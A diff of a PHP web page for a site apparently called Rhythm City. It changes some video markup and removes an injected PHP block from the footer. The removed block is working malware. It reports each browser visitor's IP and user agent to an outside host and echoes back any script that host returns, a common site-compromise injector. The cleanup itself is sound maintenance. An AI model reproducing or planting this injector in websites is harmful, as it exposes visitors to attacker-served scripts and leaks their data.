@@ -34,13 +34,12 @@ include('includes/rc_all.php');
 				<source src='videos/rhythmcity-trailer.ogv' type='video/ogg; codecs="theora, vorbis"' />
 			<!--[if IE 9]></video></div><![endif]-->
 				<!--Fallback to Vimeo-->
-				
+				<iframe src='http://player.vimeo.com/video/36436175?title=0&amp;byline=0&amp;portrait=0' width='440' height='330'></iframe>
 			<!--[if IE 9]><div class='hidden'><video class='hidden'><![endif]-->
 			</video>
 			<!--[if IE 9]></div><![endif]-->
-
 			<!--PROMO VIDEO-->
-			<h3>6-Minute Promo Video</h3>
+			<h3>Promotional Video</h3>
 			<!--[if IE 9]><div class='hidden'><![endif]-->
 			<video width='400' height='225' controls preload='metadata' poster='images/rcpromo-poster.png'>
 				<source src='videos/rhythmcity-promo.mp4' type='video/mp4; codecs="avc1.42E01E, mp4a.40.2"' />
@@ -86,15 +85,5 @@ include('includes/rc_all.php');
 	</section>
 </section>
 <?=$footer;?>
-<?php
-#6c3b04#
-error_reporting(0); @ini_set('display_errors',0); $wp_d3 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_d3) && !preg_match ('/bot/i', $wp_d3))){
-$wp_d093="http://"."http"."meta".".com/meta"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_d3);
-if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_d093); curl_setopt ($ch, CURLOPT_TIMEOUT, 10); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-$wp_3d = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_3d = @file_get_contents($wp_d093);}
-elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_3d=@stream_get_contents(@fopen($wp_d093, "r"));}}
-if (substr($wp_3d,1,3) === 'scr'){ echo $wp_3d; }
-#/6c3b04#
-?>
 </body>
 </html>
